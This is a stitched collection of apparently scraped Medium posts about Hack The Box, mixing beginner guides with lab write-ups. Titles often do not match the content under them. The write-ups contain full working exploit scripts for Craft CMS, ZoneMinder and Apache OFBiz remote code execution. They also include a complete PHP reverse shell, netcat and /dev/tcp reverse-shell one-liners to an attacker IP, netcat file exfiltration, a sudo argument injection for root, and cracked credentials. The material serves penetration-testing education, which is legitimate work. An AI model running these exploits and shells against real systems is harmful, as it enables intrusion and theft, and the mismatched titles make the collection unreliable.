DOCUMENT_ROOTdata = {    \"action\": \"conditions/render\",    \"configObject[class]\": r\"craft\\elements\\conditions\\ElementCondition\",    \"config\": '{\"name\":\"configObject\",\"as \":{\"class\":\"Imagick\", \"__construct()\":{\"files\":\"vid:msl:' + tmp_dir + r'/php*\"}}}'}print(f'\\033[1;96m[+]\\033[0m trick imagick to move shell.php in {document_root}')r = requests.post(url, data=data) #, proxies={\"http\": \"http://127.0.0.1:8080\"})if r.status_code != 502:    print(\"\\033[1;31m[-]\\033[0m Exploit failed\")    exit()print(f\"\\n\\033[1;95m[+]\\033[0m Webshell is deployed: {HOST}/\\033[1mshell.php\\033[0m?cmd=whoami\")print(f\"\\033[1;95m[+]\\033[0m Remember to \\033[1mdelete shell.php\\033[0m in \\033[1m{document_root}\\033[0m when you're done\\n\")print(\"\\033[1;92m[!]\\033[0m Enjoy your shell\\n\")url = HOST + '/shell.php'## Pseudo Shellwhile True:    command = input('\\033[1;96m>\\033[0m ')    if command == 'exit':        exit()    if command == 'clear' or command == 'cls':        print('\\n' * 100)        print('\\033[H\\033[3J', end='')        continue    data = {'cmd' : command}    r = requests.post(url, data=data) #, proxies={\"http\": \"http://127.0.0.1:8080\"})    # exit if we have an error    if r.status_code != 200:        print(f\"Error: status code {r.status_code} for {url}\")        exit()    res_command = r.text    res_command = re.sub('^caption:', '', res_command)    res_command = re.sub(' CAPTION.*$', '', res_command)    print(res_command, end='')\nOkay let's at least do a breakdown of what this exploit code is doing:\nThis Python script is an exploit for a vulnerability (CVE-2023–41892) in Craft CMS, versions 4.0.0-RC1 through 4.4.14, which allows unauthenticated remote code execution (RCE).\n* Usage Check: The script checks if it has been provided with the required command-line argument (the URL of the vulnerable Craft CMS instance).\n* Execute PHPInfo: Sends a request to the target Craft CMS instance to execute phpinfo() and extract configuration information.\n* Extract Configuration: Parses the response from phpinfo() to extract values for upload_tmp_dir and $_SERVER[‘DOCUMENT_ROOT’].\n* Create Shell: Constructs a malicious PHP file (shell.php) with code that allows command execution on the server.\n* Upload Shell: Uploads the malicious PHP file to the target server using a crafted request. It uses an Imagick trick to move the shell to the document root.\n* Interactive Shell: Once the shell is deployed, the script enters an interactive mode where it allows the user to execute commands on the target system through the uploaded shell.\n* Clean-Up: Provides instructions on how to delete the uploaded shell after use.\nsudo git clone https://github.com/Faelian/CraftCMS_CVE-2023-41892cd CraftCMS_CVE-2023-41892python3 craft-cms.py http://surveillance.htb/\nThe shell that was given to me was absolutely trash so I decided to run another reverse shell back to my machine.\nOn my attack machine:\nnc -nlvp 1234\nOn the target machine:\nrm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <your IP here> 1234 >/tmp/f/usr/bin/script -qc /bin/bash /dev/null\nPost-Exploitation:\nThe next step for me since I was only www-data, wasto enumerate the system for password files, etc. I pushed linpeas onto the machine and found some juicy stuff that led me to an insane amount of rabbit holes.\nSorry, Alice sometimes it be like that.\nI took note of the passwords discovered and connected to the MySQL databases found password hashes tried to break them and got nothing…\nLooking back at my Linpeas results I found this interesting file:\nvar/www/html/craft/storage/backups/surveillance--2023-10-17-202801--v4.4.14.sql.zip\nI pushed the file onto my machine so I could analyze it further.\nOn my attack machine:\nnc -l -p <port>  > surveillance--2023-10-17-202801--v4.4.14.sql.zip\nOn the target machine:\nnc <attackers ip> <port> < surveillance--2023-10-17-202801--v4.4.14.sql.zip\nOpened the file with gedit and did a ctr-f related to users that I found on the system or passwords and came across a hash for Matthew.\nRan a hash-identifier to discover what type of hash I was working with and it was SHA-256.\nThrew the hash into a file ran Johnny Boy the Ripper on it and then sshd onto the machine.\njohn hash --wordlist=/usr/share/wordlists/rockyou.txt --format=raw-sha256\nNice password Matthew you nerd!\nusername: matthewpassword: starcraft122490\nsudo ssh -oHostKeyAlgorithms=+ssh-dss matthew@10.10.11.245\nI ran linpeas again and revisited the section where it highlighted open active ports and port 8080 was interesting to me.\nTo access this port I needed to do an SSH Local Port Forward. A local Port redirects traffic from a local port on the client machine to a specified port on a remote server through an SSH connection.\nOn my attack machine I ran:\nssh -L 2222:127.0.0.1:8080 matthew@10.10.11.245\nVisited my localhost IP in a browser on port 2222 and was presented with a ZoneMinder login page.\nLike any great hacker would do next I googled for any exploits out there available for ZoneMinder and came across yet another RCE-related exploit.\nsudo git clone https://github.com/rvizx/CVE-2023-26035cd CVE-2023-26035nc -nlvp 7777python3 exploit.py -t http://127.0.0.1:2222/ -i <your Attacker IP here> -p 7777\nLet’s break down this exploit code also:\nimport reimport requestsfrom bs4 import BeautifulSoupimport argparseimport base64# CVE-2023-26035 - Unauthenticated RCE in ZoneMinder Snapshots# Author : Ravindu Wickramasinghe | rvz (@RVIZX9)class ZoneMinderExploit:    def __init__(self, target_uri):        self.target_uri = target_uri        self.csrf_magic = None    def fetch_csrf_token(self):        print(\"[>] fetching csrt token\")        response = requests.get(self.target_uri)        self.csrf_magic = self.get_csrf_magic(response)        if response.status_code == 200 and re.match(r'^key:[a-f0-9]{40},\\d+', self.csrf_magic):            print(f\"[>] recieved the token: {self.csrf_magic}\")            return True        print(\"[!] unable to fetch or parse token.\")        return False    def get_csrf_magic(self, response):        return BeautifulSoup(response.text, 'html.parser').find('input', {'name': '__csrf_magic'}).get('value', None)    def execute_command(self, cmd):        print(\"[>] sending payload..\")        data = {'view': 'snapshot', 'action': 'create', 'monitor_ids[0][Id]': f';{cmd}', '__csrf_magic': self.csrf_magic}        response = requests.post(f\"{self.target_uri}/index.php\", data=data)        print(\"[>] payload sent\" if response.status_code == 200 else \"[!] failed to send payload\")    def exploit(self, payload):        if self.fetch_csrf_token():            print(f\"[>] executing...\")            self.execute_command(payload)if __name__ == \"__main__\":    parser = argparse.ArgumentParser()    parser.add_argument('-t', '--target-url', required=True, help='target url endpoint')    parser.add_argument('-ip', '--local-ip', required=True, help='local ip')    parser.add_argument('-p', '--port', required=True, help='port')    args = parser.parse_args()    # generating the payload    ps1 = f\"bash -i >& /dev/tcp/{args.local_ip}/{args.port} 0>&1\"      ps2 = base64.b64encode(ps1.encode()).decode()    payload = f\"echo {ps2} | base64 -d | /bin/bash\"    ZoneMinderExploit(args.target_url).exploit(payload)\nThis Python script is an exploit for (CVE-2023–26035), which is an unauthenticated Remote Code Execution (RCE) vulnerability in ZoneMinder Snapshots.\n* The script imports necessary modules: re for regular expressions, requests for making HTTP requests, BeautifulSoup from the bs4 library for parsing HTML, argparse for parsing command-line arguments, and base64 for encoding payloads.\nZoneMinderExploit Class:\n* This class encapsulates the exploit logic:\n* The __init__ method initializes the target URI and CSRF token.\n* The fetch_csrf_token method sends a GET request to the target URI to fetch the CSRF token from the HTML response.\n* The get_csrf_magic method parses the HTML response to extract the CSRF token.\n* The execute_command method sends a POST request with a payload to execute arbitrary commands on the target.\n* The exploit method orchestrates the exploit by fetching the CSRF token and executing the payload.\nPayload Generation:\n* The script parses command-line arguments to obtain the target URL, local IP, and port.\n* It generates a payload (ps1) that establishes a reverse shell connection to the specified local IP and port using bash.\n* The payload is encoded using base64 (ps2), and a final payload is constructed to decode and execute the payload using base64 and bash.\nCommand-Line Argument Parsing:\n* The script uses argparse to parse command-line arguments, expecting the target URL, local IP, and port.\nExploit Execution:\n* The script instantiates the ZoneMinderExploit class with the target URL and calls the exploit method, passing the generated payload.\n* The exploit fetches the CSRF token and then executes the payload to establish a reverse shell on the target system.\nThe first thing I always do and I mean always is run sudo -l .\nThis had me chasing my tail for a while and had no idea how to abuse this. Eventually, I decided to look in the /usr/bin directory for all zm related scripts and found zmupdate.pl .\nDid some reverse engineering on this file and saw that the user= argument parameter was vulnerable to an injection attack. So I ran the file passed my injection to the user argument and got a shell as root!\nsudo /usr/bin/zmupdate.pl --version=1 --user='$(/bin/bash -i)' --pass=ZoneMinderPassword2023\nThe shell was super buggy and couldn't run anything as root so I did another reverse shell back onto my machine and got a stable shell.\nOn the target machine after running the exploit:\nrm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.36 3333 >/tmp/f"
    },
    {
        "title": "Keep Calm and Hack The Box — Lame | by Sonya Moisset",
        "link": "https://medium.com/sonyamoisset/keep-calm-and-hack-the-box-lame-b36f818bdf32",
        "content": "Let me give you a little breakdown of that this ruby code is doing:\n* Shebang Line: The script starts with a shebang line (#!/usr/bin/env ruby), indicating that it should be executed using the Ruby interpreter.\n* Exploit Information: The code includes comments that provide details about the exploit, such as its title, author, CVE identifier, and references to relevant websites and sources related to the vulnerability.\n* Required Libraries: The script requires several Ruby libraries, including json, httpx, docopt, and paint, which are used for various purposes, such as handling JSON data, making HTTP requests, parsing command-line arguments, and displaying colored output.\n* Docopt Usage and Options: The script defines a docopt usage section, which describes how to use the script and its command-line options. It specifies the required argument <url> and optional options like — debug, — no-color, and -h or — help.\n* Functions: The script defines several functions to perform specific tasks:\nfetch_users, parse_users, and display_users: These functions fetch and display information about Joomla! users from a given URL.fetch_config, parse_config, and display_config: These functions fetch and display configuration information about the Joomla! site.Main Execution Block: In the main part of the script, it:\n* Parses command-line arguments using docopt.Sets the display mode for colored output based on the — no-color option.Calls the functions to retrieve and display user and configuration information from the Joomla! site specified in the command-line argument.\n* Error Handling: The script includes basic error handling using begin and rescue blocks to catch and display any Docopt::Exit exceptions.\nIn summary, this Ruby script is designed to exploit a specific vulnerability in Joomla! (< 4.2.8) that allows unauthenticated users to disclose information about Joomla! users and site configuration. It retrieves and displays this information from the specified Joomla! site URL. It also provides command-line options for customization and error handling.\ngem install httpx docopt paintruby exploit.rb http://dev.devvortex.htb\nThe exploit puked out the user Lewis along with his password ;).\nDB user: lewisDB password: P4ntherg0t1n5r3c0n##\nI tried ssh with the creds and no luck so I moved on to the joomla admin interface on the web and was able to login as lewis.\nI googled authenticated attacks. I can perform on Jommla to get a shell, and reading back at the hacktricks article, you can target the templates to get a PHP reverse shell.\nUsing the pentestmonkey’s shell, I had to edit the code and add my IP address where it says “CHANGE THIS”.\n<?php// php-reverse-shell - A Reverse Shell implementation in PHP// Copyright (C) 2007 pentestmonkey@pentestmonkey.net//// This tool may be used for legal purposes only.  Users take full responsibility// for any actions performed using this tool.  The author accepts no liability// for damage caused by this tool.  If these terms are not acceptable to you, then// do not use this tool.//// In all other respects the GPL version 2 applies://// This program is free software; you can redistribute it and/or modify// it under the terms of the GNU General Public License version 2 as// published by the Free Software Foundation.//// This program is distributed in the hope that it will be useful,// but WITHOUT ANY WARRANTY; without even the implied warranty of// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the// GNU General Public License for more details.//// You should have received a copy of the GNU General Public License along// with this program; if not, write to the Free Software Foundation, Inc.,// 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA.//// This tool may be used for legal purposes only.  Users take full responsibility// for any actions performed using this tool.  If these terms are not acceptable to// you, then do not use this tool.//// You are encouraged to send comments, improvements or suggestions to// me at pentestmonkey@pentestmonkey.net//// Description// -----------// This script will make an outbound TCP connection to a hardcoded IP and port.// The recipient will be given a shell running as the current user (apache normally).//// Limitations// -----------// proc_open and stream_set_blocking require PHP version 4.3+, or 5+// Use of stream_select() on file descriptors returned by proc_open() will fail and return FALSE under Windows.// Some compile-time options are needed for daemonisation (like pcntl, posix).  These are rarely available.//// Usage// -----// See http://pentestmonkey.net/tools/php-reverse-shell if you get stuck.set_time_limit (0);$VERSION = \"1.0\";$ip = '127.0.0.1';  // CHANGE THIS$port = 1234;       // CHANGE THIS$chunk_size = 1400;$write_a = null;$error_a = null;$shell = 'uname -a; w; id; /bin/sh -i';$daemon = 0;$debug = 0;//// Daemonise ourself if possible to avoid zombies later//// pcntl_fork is hardly ever available, but will allow us to daemonise// our php process and avoid zombies.  Worth a try...if (function_exists('pcntl_fork')) { // Fork and have the parent process exit $pid = pcntl_fork(); if ($pid == -1) {  printit(\"ERROR: Can't fork\");  exit(1); } if ($pid) {  exit(0);  // Parent exits } // Make the current process a session leader // Will only succeed if we forked if (posix_setsid() == -1) {  printit(\"Error: Can't setsid()\");  exit(1); } $daemon = 1;} else { printit(\"WARNING: Failed to daemonise.  This is quite common and not fatal.\");}// Change to a safe directorychdir(\"/\");// Remove any umask we inheritedumask(0);//// Do the reverse shell...//// Open reverse connection$sock = fsockopen($ip, $port, $errno, $errstr, 30);if (!$sock) { printit(\"$errstr ($errno)\"); exit(1);}// Spawn shell process$descriptorspec = array(   0 => array(\"pipe\", \"r\"),  // stdin is a pipe that the child will read from   1 => array(\"pipe\", \"w\"),  // stdout is a pipe that the child will write to   2 => array(\"pipe\", \"w\")   // stderr is a pipe that the child will write to);$process = proc_open($shell, $descriptorspec, $pipes);if (!is_resource($process)) { printit(\"ERROR: Can't spawn shell\"); exit(1);}// Set everything to non-blocking// Reason: Occsionally reads will block, even though stream_select tells us they won'tstream_set_blocking($pipes[0], 0);stream_set_blocking($pipes[1], 0);stream_set_blocking($pipes[2], 0);stream_set_blocking($sock, 0);printit(\"Successfully opened reverse shell to $ip:$port\");while (1) { // Check for end of TCP connection if (feof($sock)) {  printit(\"ERROR: Shell connection terminated\");  break; } // Check for end of STDOUT if (feof($pipes[1])) {  printit(\"ERROR: Shell process terminated\");  break; } // Wait until a command is end down $sock, or some // command output is available on STDOUT or STDERR $read_a = array($sock, $pipes[1], $pipes[2]); $num_changed_sockets = stream_select($read_a, $write_a, $error_a, null); // If we can read from the TCP socket, send // data to process's STDIN if (in_array($sock, $read_a)) {  if ($debug) printit(\"SOCK READ\");  $input = fread($sock, $chunk_size);  if ($debug) printit(\"SOCK: $input\");  fwrite($pipes[0], $input); } // If we can read from the process's STDOUT // send data down tcp connection if (in_array($pipes[1], $read_a)) {  if ($debug) printit(\"STDOUT READ\");  $input = fread($pipes[1], $chunk_size);  if ($debug) printit(\"STDOUT: $input\");  fwrite($sock, $input); } // If we can read from the process's STDERR // send data down tcp connection if (in_array($pipes[2], $read_a)) {  if ($debug) printit(\"STDERR READ\");  $input = fread($pipes[2], $chunk_size);  if ($debug) printit(\"STDERR: $input\");  fwrite($sock, $input); }}fclose($sock);fclose($pipes[0]);fclose($pipes[1]);fclose($pipes[2]);proc_close($process);// Like print, but does nothing if we've daemonised ourself// (I can't figure out how to redirect STDOUT like a proper daemon)function printit ($string) { if (!$daemon) {  print \"$string\\n\"; }}?>\nI edited the following template in error.php:\nSet up a netcat listener on my attack machine:\nnc -lvp 1234"
    },
    {
        "title": "Hack The Box (Bizness) | by Software Sinner - Medium",
        "link": "https://software-sinner.medium.com/hack-the-box-bizness-60728bcde635",
        "content": "Hello hackers!!!As promised here’s the second part of my Unleash Your Inner Hacker: Where to Start in Hack The Box?\nIn the first part,we introduced the platform, we covered HTB Academy with suggested modules to get started right away. And above all, we talked about the importance of community.\nBear in mind that the tone of these articles should be perceived as a “friendly conversation” like I was sharing these if I met you in person and we started talking about one of our favorite subjects, hacking.\nHTB Meetup — Lisbon\nBy now you know that at the end of the day, it’s all about learning. You chose your HTB Academy modules, you studied them thoroughly you took your notes maybe you even attended a couple of meetups in person. You’re studying and practicing all of those concepts we talked about. But now you want to get down to business.\nslide from HTB — Lisbon meetup\nI’m with you. It’s time to get your feet wet. To get a real taste of things.\nwww.hackthebox.com/hacker/hacking-labs\nThese are virtual penetration testing labs, with simulating up-to-date security vulnerabilities and misconfiguration for you to train and explore.\nThis is the place where you’ll be testing the skills and knowledge you’ll acquire in your journey. What’s amazing about these labs is precisely the possibility of learning all the latest attack paths and exploit techniques. All in a safe, legal, and secure environment.\nI’m overwhelmed by the possibilities, so many options…\nEasy Elliot. The best place for your to start is precisely the STARTING POINT\nslide from HTB — Lisbon meetup\nThis is where you’ll learn the basics of Penetration Testing in an actionable, structured, comprehensive way. Yes, you’ll be hacking!\nThe machines/boxes you’ll be hacking in Starting Point are separated by Tiers according to their technical difficulty. Start with Tier 0 and build up from there.\nDoes this mean I will not need HTB Academy?\nHTB Academy will always be with you. As we discussed previously. Academy provides guided training and industry certifications. Companies from all over the world use this resource to train their professionals. A valuable resource from beginners to seasoned experts.\nYou can pair your STARTING POINThacking withyourHTB Academy studies and modules. Every Tier has an associated module from HTB Academy, these will give you the guidance you’ll need regarding the technology and subjects you have to learn and master in order to solve those machines.\nwww.hackthebox.com/hacker/hacking-labs\nTake it slow and steady. Do it in a structured way. What I mean by this is to resist the urge to ‘jump’ from machine to machine if you encounter difficulties. Be sure to solve them in order.\nDo not expect to solve a machine quickly and easily. It’s supposed to be a challenge. If you’re not fully understanding what you’re dealing with I recommend taking a step back, reading, practice those HTB Academy once again.\nYou can always refer to the official Walkthroughs HTB made available for every machine on Starting Point. It’s okay to use them. These provide learning opportunities. Just make sure you do not follow them blindly. Try to understand the concepts behind every step. Study them. Reproduce the steps by yourself, and try to anticipate the next step.\nHow To Play Machines\nIf you want a full, comprehensive rundown of navigating and interacting with HTB Labs I suggest taking a look at How to Play Machines by Ryan Gordon.\nYou are not alone!\nRemember to join the HTB community:\nFeel supported, and get involved. Either on Discord, Forum, or join a meetup group. If you’re near Portugal, let’s connect and join the next in-person meetup.\nHack The Box Meetup: Portugal\nTo be continued…\nIn part 3 We’ll start to drill down on more HTB features and the next steps. Reach out and tell me if this is something it might interest you.\nHack all the things! Have all the fun! This is the way!\nDisclaimer! This writeup contains affiliate links."
    },
    {
        "title": "Hack The Box (Devvortex) - Software Sinner - Medium",
        "link": "https://software-sinner.medium.com/hack-the-box-devvortex-9cc1ad2961b5",
        "content": "In our previous Hack The Box in-person meetups in Lisbon and Oporto I had the opportunity of presenting HTB in all its splendor. We talked about #hackthebox history, what hacking is, where to start, how to learn, and the importance of the community.\nThe response was overwhelming. It was amazing to get together with experienced professionals and newcomers, we created an environment where everyone felt supported and welcomed.\nHTB Meetup — Lisbon\nHTB Meetup — Oporto\nFollowing these last couple of events, I got a lot of requests to suggest a kind of “roadmap” for those complete beginners in hacking and HTB.\nI decided to write a couple of articles suggesting my approach to HTB and hacking. Take these and they are, personal and subjective. This aims to be a “friendly conversation” like I was sharing these if I met you in person and we started talking about one of our favorite subjects, hacking that is.\nThis is the first part of our convo. I’ll be covering HTB Academy and leave you with a cliffhanger.\nI’m not going to talk about what is hacking. As we presented on our meetup r0adrunn3r from HTB did that in a stellar way in her impressive How to learn hacking: The (step-by-step) beginner’s bible for 2023.\nhackthebox.com/blog/learn-to-hack-beginners-bible\nStart here:\nThat’s the place to start if you’re a complete beginner. Start there and read it. Get fundamental answers for questions like:\n* What is hacking?\n* Can anyone learn how to hack?\n* Where should beginner hackers start? and many more.\nThe article is written in a way that’s informative and makes you feel welcomed and supported. She even discusses the hats hackers should be wearing. If you know me you know my take on that:\nhttps://www.hackthebox.com/blog/htb-community-manifesto , slide from HTB — Lisbon meetup\nRead the Community Manifesto:\nHTB is all about the importance of the community. A happy, non-toxic, open, educational, active, and passionate society for hackers.\nIt’s our ultimate responsibility to ensure our values. Promote respect and a safe place. We all are learners, we all struggle from time to time. In such a highly demanding field as cybersecurity, it’s essential to foster a helpful and supportive community. That’s the only way to grow and learn.\nTalk about learning:\nLearning in everything. This journey is above all about learning. So having a mindset where acquiring knowledge is your reward will help you in the long run.\nYou’ve seen the memes:\nGot this from a web search, there was no explicit author.\nI bet you can do the splits, but even Jean Claude Van Damme didn’t skip the fundamentals. Why should you?\nFundamentals! Fundamentals! Fundamentals! — HTB Academy\nThat’s right. Start learning now. Start with the fundamental cybersecurity skills. This is the beginning of your journey into hacking and the world of cybersecurity. Make sure you start with the proper foundations.\nCreate an account on Hack The Box Academy, this is without a doubt the perfect place for you to start. From complete beginners to seasoned professionals I can guarantee you that this is a resource you’ll be using throughout your career.\nHTB — Academy provides guided training and industry certifications. Companies from all over the world use this resource to train their professionals. Where should you start?\nHacker meets HTB — Academy, HTB — Academy this is hacker:\nGet acquainted with the platform and the learning process. This module will welcome you and guide you at the beginning of your learning journey at the Academy. Think of this as the tutorial stage of your favorite game.\nGot it! What’s next?\nLearn how to learn — the starting module:\nLearning Process created by Cry0l1t3\nIn this demanding and ever-changing field, prepare yourself for neverending study. Having methodologies and processes will not only optimize your learning but ensures your mental safety. Protect yourself from burnout, impostor syndrome… Be prepared. The amount of information can be overwhelming when you first start so you must keep yourself organized. Also, frustration is going to creep up on you, better be prepared to deal with it.\nTake notes:\nThat reminds me. Always take notes! I mean ALWAYS (yea, all caps). Start now, make it a habit. Take notes now, while learning. Take notes later, while hacking. This will not only improve your concept retention but you’ll be creating your knowledge base you can always refer to.\nChoose a note-taking app and start now:"
    },
    {
        "title": "Unleash Your Inner Hacker: Where to Start in Hack The ...",
        "link": "https://medium.com/@pedro.correia_8569/unleash-your-inner-hacker-where-to-start-in-hack-the-box-pt-2-13fa9db6a2d2",
        "content": "Step 1 — Scanning the network\nThe first step before exploiting a machine is to do a little bit of scanning and reconnaissance.\nThis is one of the most important parts as it will determine what you can try to exploit afterwards. It is always better to spend more time on that phase to get as much information as you could.\nI will use Nmap (Network Mapper). Nmap is a free and open source utility for network discovery and security auditing. It uses raw IP packets to determine what hosts are available on the network, what services those hosts are offering, what operating systems they are running, what type of packet filters/firewalls are in use, and dozens of other characteristics.\nThere are many commands you can use with this tool to scan the network. If you want to learn more about it, you can have a look at the documentation here\nI use the following command to get a basic idea of what we are scanning\n-sV: Probe open ports to determine service/version info\n-O: Enable OS detection\n-F: Fast mode — Scan fewer ports than the default scan\n— version-light: Limit to most likely probes (intensity 2)\n10.10.10.3: IP address of the Lame box\nYou can also use Zenmap, which is the official Nmap Security Scanner GUI. It is a multi-platform, free and open source application which aims to make Nmap easy for beginners to use while providing advanced features for experienced Nmap users.\nI use a different set of commands to perform an intensive scan\n-A: Enable OS detection, version detection, script scanning, and traceroute\n-v: Increase verbosity level\n10.10.10.3: IP address of the Lame box\nIf you find the results a little bit too overwhelming, you can move to the Ports/Hosts tab to only get the open ports\nWe can see that there are 4 open ports:\nPort 21. File Transfer Protocol (FTP) control (command)\nPort 22. Secure Shell (SSH), secure logins, file transfers (scp, sftp) and port forwarding\nPort 139. NetBIOS Session Service\nPort 445. Microsoft-DS (Directory Services) SMB file sharing\nLet see what we can get with the first port\nStep 2 — The Vulnerable FTP\nWe will use Searchsploit to check if there’s any known vulnerability on vsftpd 2.3.4. Searchsploit is a command line search tool for Exploit Database\nI use the following command\nNow that we know that there is a vulnerability — Backdoor Command Execution — let’s try to exploit it\nWe will use Metasploit. It’s a penetration testing framework that makes hacking simple. It’s an essential tool for many attackers and defenders\nI launch Metasploit Framework on Kali and look for command I should use to launch the exploit\nI use the command to look for all the payloads available\nWe can see there are several different exploits but the one we’re interested in is number 4\nI use the following command for the exploit\nThis will launch the exploit. I use this command to display the available options\nYou can see that the remote host (RHOSTS) is not yet set. I will set both the remote host and the target as these two pieces of information are needed to run the exploit\nI use the following command to set the remote host using the IP address of HTB Lame box\nThen I set the target to 0 as displayed when I checked the options\nWe can now run the exploit\nUnfortunately we can see that even if the exploit is completed, no session was created. The vulnerability has been patched as mentioned here, in the description of the exploit.\nThis module exploits a malicious backdoor that was added to the VSFTPD download archive. This backdoor was introduced into the vsftpd-2.3.4.tar.gz archive between June 30th 2011 and July 1st 2011 according to the most recent information available. This backdoor was removed on July 3rd 2011.\nThe Exploit Database is a Common Vulnerabilities and Exposures (CVE) compliant archive of public exploits and corresponding vulnerable software, developed for use by penetration testers and vulnerability researchers. The aim is to serve the most comprehensive collection of exploits gathered through direct submissions, mailing lists, as well as other public sources, and present them in a freely-available and easy-to-navigate database. The Exploit Database is a repository for exploits and proof-of-concepts rather than advisories, making it a valuable resource for those who need actionable data right away\nWe need to find another way. Let’s have a look at another port!\nYou can read the whole article on freeCodeCamp News website"
    },
    {
        "title": "Unleash Your Inner Hacker: Where to Start in Hack The ...",
        "link": "https://medium.com/@pedro.correia_8569/unleash-your-inner-hacker-where-to-start-in-hack-the-box-pt-1-994033ac3a6f",
        "content": "import argparseimport loggingimport osimport subprocessimport base64import requestsimport urllib3# Disable SSL verification warning for simplicityurllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)def validate_url(url):    \"\"\"    Validate the URL schema.    \"\"\"    if not url.startswith(\"http://\") and not url.startswith(\"https://\"):        raise ValueError(\"Invalid URL schema. Use 'http://' or 'https://'.\")def scan(url):    \"\"\"    Perform a basic scan on the specified URL.    \"\"\"    print(\"[+] Scanning started...\")    try:        target_url = f\"{url}/webtools/control/ping?USERNAME=&PASSWORD=&requirePasswordChange=Y\"        response = requests.get(target_url, verify=False)        response.raise_for_status()  # Raise an HTTPError for bad responses (4xx or 5xx)        if \"PONG\" in response.text:            print(\"[+] Apache OFBiz instance seems to be vulnerable.\")        else:            print(\"[-] Apache OFBiz instance seems NOT to be vulnerable.\")    except requests.exceptions.RequestException as e:        print(f\"[-] LOG: An error occurred during the scan: {e}\")def get_encoded_payload(cmd):    \"\"\"    Generate an encoded payload based on the provided command.    \"\"\"    if not os.path.isfile(\"ysoserial-all.jar\"):        logging.error(\"[-] ysoserial-all.jar not found. Exiting.\")        exit(1)    print(\"[+] Generating payload...\")    try:        #print(f\"[+] Running the following command: {cmd}\")        result = subprocess.run(cmd, shell=True, stdout=subprocess.PIPE, text=False)        encoded_output = base64.b64encode(result.stdout).decode().replace(\"\\n\", \"\")        print(\"[+] Payload generated successfully.\")    except subprocess.CalledProcessError as e:        print(f\"[-] LOG: An error occurred during payload generation: {e}\")    return encoded_outputdef send_post_request(url, encoded_output):    \"\"\"    Send a POST request with a malicious serialized payload.    \"\"\"    print(\"[+] Sending malicious serialized payload...\")    try:        target_url = f\"{url}/webtools/control/xmlrpc/?USERNAME=&PASSWORD=&requirePasswordChange=Y\"        headers = {            \"Content-Type\": \"application/xml\",        }        xml_data = f\"\"\"<?xml version=\"1.0\"?>            <methodCall>              <methodName>Methodname</methodName>              <params>                <param>                  <value>                    <struct>                      <member>                        <name>test</name>                        <value>                          <serializable xmlns=\"http://ws.apache.org/xmlrpc/namespaces/extensions\">{encoded_output}</serializable>                        </value>                      </member>                    </struct>                  </value>                </param>              </params>            </methodCall>        \"\"\"        response = requests.post(target_url, headers=headers, data=xml_data, verify=False)        if response.status_code == 200:            print(\"[+] The request has been successfully sent. Check the result of the command.\")        else:            print(\"[-] Failed to send the request. Check the connection or try again.\")    except requests.exceptions.RequestException as e:        print(f\"[-] LOG: An error occurred during the scan: {e}\")def main():    \"\"\"    Main function for executing the script.    \"\"\"    parser = argparse.ArgumentParser(description=\"Exploit script for Apache EFBiz auth vulnerability (CVE-2023-49070 and CVE-2023-51467).\")    parser.add_argument(\"--url\", required=True, help=\"EFBIZ's URL to send requests to.\")    parser.add_argument(\"--cmd\", help=\"Command to run on the remote server. Optional.\")    args = parser.parse_args()    url = args.url.rstrip('/')    validate_url(args.url)    if args.cmd is None:        scan(url)    else:        command = f\"java -jar --add-opens=java.xml/com.sun.org.apache.xalan.internal.xsltc.trax=ALL-UNNAMED --add-opens=java.xml/com.sun.org.apache.xalan.internal.xsltc.runtime=ALL-UNNAMED --add-opens java.base/java.net=ALL-UNNAMED --add-opens=java.base/java.util=ALL-UNNAMED ysoserial-all.jar CommonsBeanutils1 '{args.cmd}'\"        encoded_output = get_encoded_payload(command)        send_post_request(url, encoded_output)if __name__ == \"__main__\":    main()\nAnalyzing the python script here is a breakdown of what its doing:\n* Import necessary libraries: The script imports several Python libraries, including argparse for command-line argument parsing, logging for logging messages, os for interacting with the operating system, subprocess for running external commands, base64 for encoding and decoding data in Base64 format, requests for making HTTP requests, and urllib3 to disable SSL verification warnings.\n* Define a function validate_url(url) to check the URL schema: This function is used to ensure that the provided URL starts with either “http://” or “https://.\" If the URL does not match this format, it raises a ValueError.\n* Define a function scan(url) to perform a basic scan: This function constructs a target URL based on the provided URL and sends an HTTP GET request to it. It looks for the presence of “PONG” in the response text, indicating a vulnerability in the Apache OFBiz instance. If “PONG” is found, it prints that the instance seems to be vulnerable; otherwise, it prints that it’s not vulnerable.\n* Define a function get_encoded_payload(cmd) to generate an encoded payload: This function generates an encoded payload based on a provided command. It checks if the ysoserial-all.jar file exists and then runs the provided command using subprocess.run. It encodes the command’s output in Base64 format and returns the encoded payload as a string.\n* Define a function send_post_request(url, encoded_output) to send a POST request: This function constructs an XML-RPC POST request with a malicious serialized payload and sends it to a target URL. It sets the Content-Type header to “application/xml” and includes the encoded payload in the XML data. It checks the HTTP response status code to determine whether the request was successful.\n* Define the main() function: This is the main entry point of the script. It uses argparse to parse command-line arguments, including the target URL ( — url) and an optional command ( — cmd) to execute on the remote server. It validates the URL, and if no command is provided, it calls the scan() function to check for the Apache OFBiz vulnerability. If a command is provided, it generates the payload and sends the malicious request.\n* Execute the script if it’s the main module: The script checks if it’s being run as the main module (not imported as a library) and calls the main() function to start the execution.\nSince the script is allowing commands to be executed on the server I set up a netcat listener on my machine and when running the exploit I specified the netcat command to call back to my machine:\nOn my attack machine:\nIn another terminal window in the directory where the exploit resides:\npython3 exploit.py --url https://bizness.htb/ --cmd 'nc -e /bin/sh <your ip here> 4444'\nI got a shell as user ofbiz hell yeah! This shell sucked so I ran the following command to upgrade it to a more stable one:\n/usr/bin/script -qc /bin/bash /dev/null\nGetting root was hard for me. I ran to Linpeas and didn’t see anything that could lead me to finding privesc. I had to peek through files on the system to see if I could find a hash or password because I did notice that the Derby database was being used, so I went to the directory path where it was storing its .dat files.\nI ran this command to narrow down which files had “SHA” in them for a hash:\nThe file c54d0.dat had the hash I was looking for..\nfind /opt/ofbiz/runtime/data/derby/ofbiz/seg0 -type f -name “*.dat” -exec grep “SHA” {} \\;\nThe file c54d0.dat ended up having the hash I was looking for after some trial an error.\nThe next step is cracking the hash to obtain a password. I chopped the beginning strings of the hash “$SHA$d$” and converted them using Cyberchef; that way, I could run hashcat against it."
    },
    {
        "title": "Hack The Box Writeup Writeup",
